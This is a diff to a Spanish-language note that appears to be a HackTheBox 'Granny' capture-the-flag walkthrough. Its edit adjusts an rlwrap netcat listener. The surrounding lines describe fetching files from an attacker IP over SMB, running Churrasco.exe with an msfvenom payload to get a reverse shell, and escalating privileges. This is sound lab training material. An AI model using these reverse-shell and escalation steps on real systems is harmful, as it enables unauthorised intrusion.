@@ -35,6 +35,6 @@ Y desde la maquina victima vamos a descargar los archivos con `copy \\10.10.16.1
 Ejecutamos el [[Churrasco.exe]] pasandole el *exploit.exe* que creamos para enviarnos una [[Reverse shell]] con [[msfvenom]]
 
 ![[Granny14.png]]
-Mientras estamos en escucha con [[rlwrap nc -lvnp 443]] con el comando `rlwrap nc -nlvp 500` para enviarnos una [[Reverse shell]]
+Mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]] con el comando `rlwrap nc -nlvp 500` para enviarnos una [[Reverse shell]]
 ![[Granny12.png]]
 Ya elevamos nuestro privilegio al maximo y podemos ver las flags
